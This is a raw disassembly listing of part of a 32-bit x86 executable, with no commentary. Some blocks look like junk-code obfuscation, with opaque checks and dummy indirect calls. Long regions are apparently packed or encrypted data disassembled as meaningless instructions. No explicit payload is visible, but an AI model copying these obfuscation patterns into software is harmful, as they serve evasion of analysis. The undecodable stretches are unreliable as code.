  40185f:	cmp    eax,0xfa126ff8
  401864:	loop   0x4018ac
  401866:	in     al,0x9e
  401868:	or     dh,dh
  40186a:	push   ecx
  40186b:	jle    0x401848
  40186d:	(bad)  
  40186e:	imul   esi,esi,0x6a
  401871:	sbb    al,0x43
  401873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401874:	sbb    cl,bl
  401876:	leave  
  401877:	retf   0x4b88
  40187a:	xor    dh,BYTE PTR [eax-0x355bbb7]
  401880:	out    0x4d,eax
  401882:	and    ah,BYTE PTR [ebx]
  401884:	lock mov ds:0xf993525c,al
  40188a:	fs or  edx,esi
  40188d:	outs   dx,DWORD PTR ds:[esi]
  40188e:	pop    ebp
  40188f:	pop    edi
  401890:	or     al,0xcc
  401892:	shl    esp,0x88
  401895:	xchg   edx,eax
  401896:	xor    DWORD PTR [edi-0x7],ebp
  401899:	add    al,0x9d
  40189b:	inc    ebx
  40189c:	mov    ecx,0x4233d401
  4018a1:	pop    edx
  4018a2:	add    ecx,eax
  4018a4:	add    eax,0xa460b1f8
  4018a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018aa:	add    DWORD PTR [esi+0xb04bdf4],edi
  4018b0:	xchg   esp,eax
  4018b1:	bnd jae 0x4018cf
  4018b4:	dec    ebp
  4018b5:	imul   ebp,DWORD PTR [ebp-0x63],0x78
  4018b9:	xchg   esi,eax
  4018ba:	xlat   BYTE PTR ds:[ebx]
  4018bb:	add    eax,0x7539d0dd
  4018c0:	dec    ebp
  4018c1:	push   cs
  4018c2:	or     dl,cl
  4018c4:	je     0x401884
  4018c6:	ffree  st(3)
  4018c8:	rcl    eax,1
  4018ca:	(bad)  
  4018cb:	cs ret 
  4018cd:	sbb    ch,BYTE PTR [edi+esi*4]
  4018d0:	fnstcw WORD PTR ds:0x5b49a3c5
  4018d6:	inc    esp
  4018d7:	and    esp,DWORD PTR [ecx]
  4018d9:	into   
  4018da:	sbb    eax,0x6f7ffb42
  4018df:	lods   al,BYTE PTR ds:[esi]
  4018e0:	inc    ebx
  4018e1:	ss inc esi
  4018e3:	fcmovnbe st,st(0)
  4018e5:	neg    BYTE PTR [edi+eiz*2-0x5234d993]
  4018ec:	ret    
  4018ed:	cmp    dh,dl
  4018ef:	add    edx,DWORD PTR [ebp-0x17]
  4018f2:	xor    esi,ebp
  4018f4:	jns    0x4018bb
  4018f6:	out    0x44,ax
  4018f9:	fistp  DWORD PTR [edi]
  4018fb:	enter  0xcbfe,0xfb
  4018ff:	sbb    al,0xbf
  401901:	and    eax,0x7bd5ce6a
  401906:	jb     0x4018ca
  401908:	or     bl,ah
  40190a:	sub    al,0xe2
  40190c:	sbb    eax,0xdb2a9402
  401911:	sbb    edi,DWORD PTR [eax-0x7917f492]
  401917:	pop    ecx
  401918:	pop    esi
  401919:	cmp    al,al
  40191b:	(bad)  
  40191c:	scas   eax,DWORD PTR es:[edi]
  40191d:	aam    0x6a
  40191f:	out    dx,al
  401920:	pop    ebx
  401921:	mov    ebp,0x4226d2fe
  401926:	xor    edi,esi
  401928:	adc    eax,esp
  40192a:	test   ebp,edx
  40192c:	imul   edi,edi,0x6a
  40192f:	adc    ah,BYTE PTR [eax-0x23]
  401932:	inc    edi
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x4282c7,0x0
  401946:	not    DWORD PTR ds:0x42833f
  40194c:	mov    edi,DWORD PTR ds:0x4281e3
  401952:	mov    DWORD PTR ds:0x4282df,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42834b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x4282c7,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428dcc
  401981:	mov    edx,DWORD PTR ds:0x4283e7
  401987:	adc    DWORD PTR ds:0x42834f,edx
  40198d:	and    edx,DWORD PTR ds:0x42829f
  401993:	add    DWORD PTR ds:0x4282cf,edx
  401999:	mov    edi,DWORD PTR ds:0x4281c3
  40199f:	xor    DWORD PTR ds:0x4281eb,edi
  4019a5:	and    DWORD PTR ds:0x4281bb,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x4283cb
  4019b4:	sub    ecx,DWORD PTR ds:0x4282cb
  4019ba:	mov    DWORD PTR ds:0x4283cb,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x4283db,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x4283d3,0x339b
  4019e6:	mov    eax,ds:0x422420
  4019eb:	cmp    DWORD PTR ds:0x4282b7,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x4282c7
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x4282b7,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x4282d7
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428eb8
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x4281d7
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x4281c7
  401a44:	sub    DWORD PTR ds:0x428353,ecx
  401a4a:	add    DWORD PTR ds:0x4281d3,0x4282cb
  401a54:	xor    edx,DWORD PTR ds:0x42833b
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281e3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281e3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x4282b7
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42836f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x4282bb,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281e3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428dd0
  401ac0:	sub    edx,DWORD PTR ds:0x4283f3
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x4283df
  401ad4:	adc    ecx,DWORD PTR ds:0x4281cf
  401ada:	mov    DWORD PTR ds:0x4283df,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x4281cb
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x4281b3,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x4282c7,0x6ba0
  401b03:	mov    DWORD PTR ds:0x4281df,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x4281bf,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x4281b3,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428f20
  401b3a:	movzx  edx,WORD PTR ds:0x4282ef
  401b41:	and    edx,DWORD PTR ds:0x4281cb
  401b47:	mov    DWORD PTR ds:0x4282ef,edx
  401b4d:	and    DWORD PTR ds:0x4282a7,edx
  401b53:	add    DWORD PTR ds:0x4283eb,edx
  401b59:	sub    edx,DWORD PTR ds:0x4282f3
  401b5f:	add    DWORD PTR ds:0x4282ab,edi
  401b65:	or     edx,DWORD PTR ds:0x4283d7
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42835b,0x0
  401b78:	mov    DWORD PTR ds:0x4282f3,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x4281c3,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428297
  401ba1:	cmp    DWORD PTR ds:0x42835b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428de4
  401bc7:	sub    DWORD PTR ds:0x428347,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x4282ab
  401bd4:	add    DWORD PTR ds:0x428357,edx
  401bda:	add    DWORD PTR ds:0x4281af,ebx
  401be0:	sbb    DWORD PTR ds:0x42827f,edi
  401be6:	inc    DWORD PTR ds:0x42827f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283e3,0x428287
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0x41b0afeb
  401c11:	sbb    al,0x6f
  401c13:	mov    al,0x25
  401c15:	or     bl,BYTE PTR [eax]
  401c17:	sbb    BYTE PTR [esi-0x1ee7e7ee],bl
  401c1d:	dec    ebx
  401c1e:	ja     0x401c4f
  401c20:	int    0x70
  401c22:	dec    ecx
  401c23:	pop    ebp
  401c24:	push   ecx
  401c25:	jb     0x401c1e
  401c27:	mov    dl,0x71
  401c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c2a:	pop    esp
  401c2b:	push   eax
  401c2c:	repz jmp 0x8bd98461
  401c32:	test   al,0xa9
  401c34:	mov    ah,0x30
  401c36:	leave  
  401c37:	sbb    DWORD PTR [ebx],ebx
  401c39:	(bad)  
  401c3a:	fwait
  401c3b:	jno    0x401c03
  401c3d:	or     eax,DWORD PTR [edx]
  401c3f:	add    al,0x5f
  401c41:	add    eax,0x15d247f
  401c46:	stc    
  401c47:	mov    bh,0x6d
  401c49:	xlat   BYTE PTR ds:[ebx]
  401c4a:	lock fs (bad) 
  401c4d:	sbb    ebx,eax
  401c4f:	xchg   esi,eax
  401c51:	mov    BYTE PTR [edx-0x4c],dl
  401c54:	sbb    DWORD PTR fs:[ebx+0x17e40863],edx
  401c5b:	(bad)  [edi]
  401c5d:	adc    eax,0x201d6190
  401c62:	inc    esp
  401c63:	cmp    DWORD PTR [eax-0x55],esi
  401c66:	or     al,0xfa
  401c68:	(bad)  
  401c69:	jmp    0x401c2c
  401c6b:	xor    DWORD PTR [eax],edx
  401c6d:	dec    ebp
  401c6e:	out    0x33,eax
  401c70:	int3   
  401c71:	adc    ah,BYTE PTR [ebx+eiz*8]
  401c74:	(bad)  
  401c75:	dec    esi
  401c76:	mov    bl,0xef
  401c78:	sub    eax,0x99ef76d9
  401c7d:	mov    dh,BYTE PTR ds:0xe582613
  401c83:	icebp  
  401c84:	ja     0x401c7c
  401c86:	pop    ebp
  401c87:	jmp    0x63e7:0xade19a27
  401c8e:	hlt    
  401c8f:	in     eax,0x88
  401c91:	xchg   edi,eax
  401c92:	sbb    bl,BYTE PTR [ebp+esi*8-0x49b77739]
  401c99:	adc    BYTE PTR [edi+0x68344b60],0xa8
  401ca0:	sub    dl,ch
  401ca2:	add    DWORD PTR [ecx-0x4d],esi
  401ca5:	and    ebp,DWORD PTR [edx+0x57c23489]
  401cab:	mov    cl,0x82
  401cad:	xchg   edx,eax
  401cae:	jle    0x401c4f
  401cb0:	mov    dl,0xbf
  401cb2:	rcl    DWORD PTR [esi+0x40],cl
  401cb5:	enter  0x7b19,0x74
  401cb9:	sub    ah,BYTE PTR [edi+0x46]
  401cbc:	xchg   esp,eax
  401cbd:	xor    DWORD PTR [ebx+ecx*1+0x43f5f9ea],ebx
  401cc4:	inc    eax
  401cc5:	(bad)  
  401cc6:	sbb    edi,edi
  401cc8:	cmp    al,0xbb
  401cca:	ror    DWORD PTR [ebp+0x7e068ba8],1
  401cd0:	leave  
  401cd1:	je     0x401cc7
  401cd3:	push   ebp
  401cd4:	or     BYTE PTR [ebx+0x49],al
  401cd7:	leave  
  401cd8:	cmp    al,0xec
  401cda:	mov    ecx,0x62f2c5
  401cdf:	xor    DWORD PTR [ebp+0x67806abe],ebp
  401ce5:	add    al,0x71
  401ce7:	xor    ecx,DWORD PTR [esi]
  401ce9:	mov    ebx,DWORD PTR [esi+0x28]
  401cec:	mov    bl,0x91
  401cee:	loop   0x401d03
  401cf0:	sub    cl,BYTE PTR [esi]
  401cf2:	sbb    BYTE PTR [ecx-0x3b],cl
  401cf5:	(bad)  
  401cf7:	push   eax
  401cf8:	push   ecx
  401cf9:	add    BYTE PTR [ecx],0xe2
  401cfc:	dec    ecx
  401cfd:	popf   
  401cfe:	xor    eax,0x6e61dd43
  401d03:	push   cs
  401d04:	loop   0x401c90
  401d06:	dec    esp
  401d07:	push   eax
  401d08:	sbb    BYTE PTR ds:0xe10598eb,cl
  401d0e:	into   
  401d0f:	mov    ebp,0xdafe9aca
  401d14:	push   esp
  401d15:	xlat   BYTE PTR ds:[ebx]
  401d16:	pop    edi
  401d17:	aaa    
  401d18:	jp     0x401ca7
  401d1a:	inc    ebp
  401d1b:	and    al,0x92
  401d1d:	xor    esi,DWORD PTR [ecx-0x7c5bd1b3]
  401d23:	adc    ebx,ecx
  401d25:	dec    esi
  401d26:	inc    esp
  401d27:	adc    bl,bh
  401d29:	out    dx,eax
  401d2a:	or     al,0xdd
  401d2c:	rol    esi,cl
  401d2e:	sub    al,0xac
  401d30:	mov    ds:0x7e109b7c,al
  401d35:	and    DWORD PTR [esi-0x34e4b273],ecx
  401d3b:	shl    BYTE PTR ds:0x553838f7,1
  401d41:	outs   dx,DWORD PTR ds:[esi]
  401d42:	or     DWORD PTR [edi-0x7c1f4fc9],esi
  401d48:	cld    
  401d49:	xchg   ebp,eax
  401d4a:	loop   0x401d3b
  401d4c:	leave  
  401d4d:	int    0x48
  401d4f:	xor    al,0xa0
  401d51:	jnp    0x401cf8
  401d53:	sbb    al,0x41
  401d55:	rsm    
  401d57:	sbb    BYTE PTR [esi+0x33788611],al
  401d5d:	inc    ebp
  401d5e:	fiadd  WORD PTR [ecx+0x70178e4b]
  401d64:	loopne 0x401d5e
  401d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d67:	stos   BYTE PTR es:[edi],al
  401d68:	xchg   ebp,eax
  401d69:	dec    edx
  401d6a:	rcr    DWORD PTR [eax+0x68767f14],1
  401d70:	push   cs
  401d71:	cmp    eax,0xe5cfdd9b
  401d76:	xchg   edx,eax
  401d77:	inc    ebx
  401d78:	pusha  
  401d79:	or     edx,DWORD PTR [ebp+0x18ff7d1a]
  401d7f:	retf   
  401d80:	xor    BYTE PTR [esi+0x29],0xdf
  401d84:	int    0x95
  401d86:	(bad)
  401d8a:	jns    0x401d43
  401d8c:	or     DWORD PTR [ecx],esp
  401d8e:	daa    
  401d8f:	scas   al,BYTE PTR es:[edi]
  401d90:	jge    0x401d5b
  401d92:	sub    esp,DWORD PTR [edx]
  401d94:	(bad)  
  401d95:	in     eax,0x2a
  401d97:	retf   0xeae4
  401d9a:	jbe    0x401dec
  401d9c:	jmp    FWORD PTR [edx+0x3b]
  401d9f:	inc    ebp
  401da0:	inc    esi
  401da1:	ja     0x401da7
  401da3:	ficom  DWORD PTR [edi]
  401da5:	add    DWORD PTR [edx],esp
  401da7:	into   
  401da8:	push   ecx
  401da9:	sbb    edx,esi
  401dab:	sub    DWORD PTR [ebp-0x52],0x30bd8da0
  401db2:	ror    BYTE PTR [ecx-0x48],0xf0
  401db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401db7:	stos   BYTE PTR es:[edi],al
  401db8:	mov    cs:0x2e5d4b38,eax
  401dbe:	fild   WORD PTR [ebp+0x28]
  401dc1:	outs   dx,DWORD PTR ds:[esi]
  401dc2:	push   edx
  401dc3:	jecxz  0x401e05
  401dc5:	test   eax,0x48a4bc9b
  401dca:	xchg   ebx,eax
  401dcb:	inc    esp
  401dcc:	and    al,0x4c
  401dce:	xchg   esi,eax
  401dcf:	fs (bad) 
  401dd1:	popf   
  401dd2:	dec    eax
  401dd3:	add    bl,BYTE PTR [ebx]
  401dd5:	xchg   esp,eax
  401dd6:	fld    QWORD PTR [ebp+0x2645518f]
  401ddc:	sub    ebx,0x8934c07
  401de2:	inc    ebp
  401de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de4:	and    ecx,ecx
  401de6:	lea    esi,[edi+0x1f009146]
  401dec:	ins    DWORD PTR es:[edi],dx
  401ded:	mov    cl,0xa6
  401def:	loopne 0x401d92
  401df1:	loope  0x401db4
  401df3:	add    DWORD PTR [edx-0x38],esi
  401df6:	es mov dh,0xc7
  401df9:	pop    esp
  401dfa:	add    dh,BYTE PTR [ecx-0x5d]
  401dfd:	dec    ecx
  401dfe:	cmp    DWORD PTR ds:0xfec4a433,esi
  401e04:	lods   eax,DWORD PTR ds:[esi]
  401e05:	or     dl,BYTE PTR [esi]
  401e07:	add    eax,0x8506c0b9
  401e0c:	cmp    DWORD PTR [ecx+0xea3c17f],esp
  401e12:	cld    
  401e13:	pusha  
  401e14:	pop    ebx
  401e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e16:	in     eax,dx
  401e17:	sub    eax,0x83bc17a3
  401e1c:	ret    
  401e1d:	mov    cl,0xa8
  401e1f:	cs test eax,0x2c161202
  401e25:	out    dx,eax
  401e26:	fidiv  WORD PTR ss:[esi]
  401e29:	push   cs
  401e2a:	das    
  401e2b:	push   edi
  401e2c:	cli    
  401e2d:	not    BYTE PTR [eax]
  401e2f:	cmp    edi,DWORD PTR [edx]
  401e31:	push   cs
  401e32:	icebp  
  401e33:	test   eax,0xac0c6c1f
  401e38:	mov    esi,0x9b5242de
  401e3d:	imul   eax,DWORD PTR [ebx+0x7faaefe3],0x979227b2
  401e47:	push   ebp
  401e48:	push   eax
  401e49:	inc    eax
  401e4a:	arpl   WORD PTR [ebx-0x62],bp
  401e4d:	xchg   ebx,eax
  401e4e:	sub    al,0x95
  401e50:	ja     0x401e30
  401e52:	or     al,0x7
  401e54:	shr    BYTE PTR [eax+0xb30f721],1
  401e5a:	adc    BYTE PTR [ecx+eiz*2],bl
  401e5d:	iret   
  401e5e:	std    
  401e5f:	fcomp  QWORD PTR [esi+esi*2+0x8]
  401e63:	lock fdiv st,st(6)
  401e66:	ret    
  401e67:	jbe    0x401e12
  401e69:	(bad)  
  401e6a:	int    0xc0
  401e6c:	or     al,0xbb
  401e6e:	jl     0x401df1
  401e70:	pop    es
  401e71:	ret    
  401e72:	loope  0x401e6a
  401e74:	ins    DWORD PTR es:[edi],dx
  401e75:	dec    ebx
  401e76:	xchg   esi,eax
  401e77:	sar    ecx,0xcd
  401e7a:	or     al,0xe2
  401e7c:	mov    ah,0x1a
  401e7e:	xchg   ebx,eax
  401e7f:	ss jl  0x401e18
  401e82:	ja     0x401e69
  401e84:	std    
  401e85:	push   ebp
  401e86:	ds jmp 0xc1e4:0xc47c83bf
  401e8e:	mov    al,0xea
  401e90:	gs ja  0x401e17
  401e93:	mov    ebx,0xcbfb3
  401e98:	stc    
  401e99:	mov    cl,0x9
  401e9b:	ins    DWORD PTR es:[edi],dx
  401e9c:	loop   0x401e67
  401e9e:	cwde   
  401e9f:	mov    al,ds:0xd5ae3998
  401ea4:	push   ebx
  401ea5:	add    al,0x76
  401ea7:	mov    al,0x50
  401ea9:	mov    BYTE PTR [esi],ch
  401eab:	lahf   
  401eac:	loop   0x401e4b
  401eae:	sbb    eax,0x4de71451
  401eb3:	dec    esp
  401eb4:	jns    0x401f29
  401eb6:	push   esi
  401eb7:	shl    DWORD PTR [edx],0x35
  401eba:	mov    esp,0x3bf9c464
  401ebf:	lods   eax,DWORD PTR ds:[esi]
  401ec0:	sbb    edi,DWORD PTR ds:0x730ff1f9
  401ec6:	mov    dh,0xaa
  401ec8:	adc    BYTE PTR [ebx+ecx*4-0x50],al
  401ecc:	pop    ss
  401ecd:	mov    bl,0x34
  401ecf:	fwait
  401ed0:	adc    ebx,DWORD PTR [edx]
  401ed2:	sti    
  401ed3:	popf   
  401ed4:	aaa    
  401ed5:	cwde   
  401ed6:	dec    eax
  401ed7:	stos   DWORD PTR es:[edi],eax
  401ed8:	(bad)  
  401ed9:	lds    edi,FWORD PTR [esi]
  401edb:	sti    
  401edc:	in     eax,0x9
  401ede:	sahf   
  401edf:	mov    bh,0xc7
  401ee1:	sbb    esi,0x71
  401ee4:	add    eax,0x8397156e
  401ee9:	push   es
  401eea:	(bad)  
  401eec:	loopne 0x401edb
  401eee:	push   ss
  401eef:	mov    al,ds:0x2d15af67
  401ef4:	ins    BYTE PTR es:[edi],dx
  401ef5:	repnz cmp ebp,ecx
  401ef8:	sbb    eax,0x7cc7c233
  401efd:	jmp    DWORD PTR [esi+0x42432fbf]
  401f03:	or     DWORD PTR [esi-0x23],0x16
  401f07:	add    al,0x24
  401f09:	and    DWORD PTR [edx+0x2c],esi
  401f0c:	aaa    
  401f0d:	adc    BYTE PTR [ecx],bh
  401f0f:	jb     0x401ec0
  401f11:	xor    BYTE PTR [eax+0x4f],0x9a
  401f15:	popa   
  401f16:	out    0x9d,al
  401f18:	push   ss
  401f19:	inc    edi
  401f1a:	(bad)  
  401f1b:	rol    bh,0xf
  401f1e:	mov    ds:0xca2ff2f2,al
  401f23:	jnp    0x401f6c
  401f25:	call   0xd7d6ed27
  401f2a:	xchg   DWORD PTR [ebp+0x14],edi
  401f2d:	jmp    0x401f93
  401f2f:	out    0x9,al
  401f31:	ins    BYTE PTR es:[edi],dx
  401f32:	fwait
  401f33:	xchg   edi,eax
  401f34:	(bad)  
  401f36:	cmp    al,0xe2
  401f38:	sub    eax,0x844bdfca
  401f3d:	xchg   BYTE PTR [edx-0x7d],dh
  401f40:	inc    esi
  401f41:	mov    esi,?
  401f43:	mul    al
  401f45:	div    ah
  401f47:	fs (bad) 
  401f49:	xor    ah,BYTE PTR [edi]
  401f4b:	addr16 (bad) 
  401f4d:	fs xchg esi,eax
  401f4f:	rcl    BYTE PTR [edx-0x2ce9a6ff],0x0
  401f56:	imul   esp,DWORD PTR [esi+ebp*4],0x13
  401f5a:	xor    eax,0x268ab87d
  401f5f:	pop    eax
  401f60:	cmp    ecx,ebp
  401f62:	sub    BYTE PTR [ecx],dh
  401f64:	pusha  
  401f65:	ret    
  401f66:	fst    DWORD PTR [edx+0x436f5ac3]
  401f6c:	aas    
  401f6d:	iret   
  401f6e:	cmp    ebp,esi
  401f70:	mov    bh,0x7
  401f72:	fwait
  401f73:	data16 jns 0x401f88
  401f76:	aaa    
  401f77:	add    bl,0xd
  401f7a:	shl    DWORD PTR [edi],1
  401f7c:	mov    ecx,0xfed6dd95
  401f81:	sbb    al,0x1f
  401f83:	inc    ebx
  401f84:	test   esi,ecx
  401f86:	fistp  DWORD PTR [ebp+0x787d1aeb]
  401f8c:	js     0x40200d
  401f8e:	addr16 retf 0x9519
  401f92:	out    dx,al
  401f93:	pop    edx
  401f94:	jnp    0x402013
  401f96:	ins    BYTE PTR es:[edi],dx
  401f97:	neg    DWORD PTR [esi+0x5fddad4c]
  401f9d:	sub    al,0xd3
  401f9f:	dec    edi
  401fa0:	push   cs
  401fa1:	mov    ebx,0xa8224cb9
  401fa6:	leave  
  401fa7:	dec    esp
  401fa8:	or     cl,BYTE PTR [ecx-0x311d3beb]
  401fae:	stos   BYTE PTR es:[edi],al
  401faf:	rcl    BYTE PTR [edx+0x4f],1
  401fb2:	mov    ebx,0x437ddb43
  401fb7:	or     eax,0x97c62e51
  401fbc:	lds    ebp,FWORD PTR [edx+0x18b3556c]
  401fc2:	pop    ebp
  401fc3:	xlat   BYTE PTR ds:[ebx]
  401fc4:	imul   edx,DWORD PTR [edi-0x2e78cca3],0x1737ba1e
  401fce:	mov    BYTE PTR [ecx-0x6d],ah
  401fd1:	xchg   ebx,eax
  401fd2:	jb     0x401f86
  401fd4:	pop    esp
  401fd5:	je     0x401f5a
  401fd7:	in     al,dx
  401fd8:	or     edi,edi
  401fda:	cmp    BYTE PTR [eax-0x3baa76a8],bl
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x4283bb
  401fec:	adc    DWORD PTR ds:0x4283f7,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x4283db,0x0
  402000:	mov    DWORD PTR ds:0x4282db,0x4df8
  40200a:	mov    DWORD PTR ds:0x4283c3,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x4283db,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428de8
  40203e:	or     DWORD PTR ds:0x4281bf,0x6f29
  402048:	xor    DWORD PTR ds:0x42835b,0x42834f
  402052:	add    DWORD PTR ds:0x4282db,0x428377
  40205c:	and    DWORD PTR ds:0x4283eb,edi
  402062:	mov    DWORD PTR ds:0x4282cb,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281eb,0x4281ab
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x42833f,0x0
  402084:	mov    DWORD PTR ds:0x42833b,ecx
  40208a:	mov    DWORD PTR ds:0x4281e7,0x59f
  402094:	mov    DWORD PTR ds:0x4281e7,ecx
  40209a:	mov    DWORD PTR ds:0x428367,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x42833f,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x4281bb
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428f24
  4020ce:	sbb    DWORD PTR ds:0x4283cb,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42834b,0x4282bf
  4020e2:	adc    DWORD PTR ds:0x4283bf,0x4c73
  4020ec:	add    DWORD PTR ds:0x4283bf,0x4283ef
  4020f6:	and    DWORD PTR ds:0x4281a7,0x4283c3
  402100:	sbb    DWORD PTR ds:0x4281ab,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x42833f,0x4282ef
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x42833b
  40213c:	add    DWORD PTR ds:0x4282d7,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x4283cb
  40214e:	add    DWORD PTR ds:0x428367,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x4281b7,0x0
  402162:	mov    DWORD PTR ds:0x4283db,0x750f
  40216c:	not    DWORD PTR ds:0x4283c3
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x4282bb,0x610f
  402181:	mov    eax,ds:0x4281cf
  402186:	cmp    DWORD PTR ds:0x4281b7,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x4280b9
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428ec0
  4021b1:	adc    DWORD PTR ds:0x4282df,0x4282b3
  4021bb:	add    DWORD PTR ds:0x42829f,0x168f
  4021c5:	sub    DWORD PTR ds:0x428343,0x4281e3
  4021cf:	or     DWORD PTR ds:0x4283e3,0xa53
  4021d9:	mov    eax,ds:0x428297
  4021de:	xor    DWORD PTR ds:0x4281ab,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0x7c87ebf3
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi+0x56181812],bl
  40220e:	cwde   
  40220f:	aad    0xde
  402211:	gs jbe 0x40221d
  402214:	int3   
  402215:	pop    edx
  402216:	test   ebp,ebx
  402218:	outs   dx,BYTE PTR ds:[esi]
  402219:	add    al,0xeb
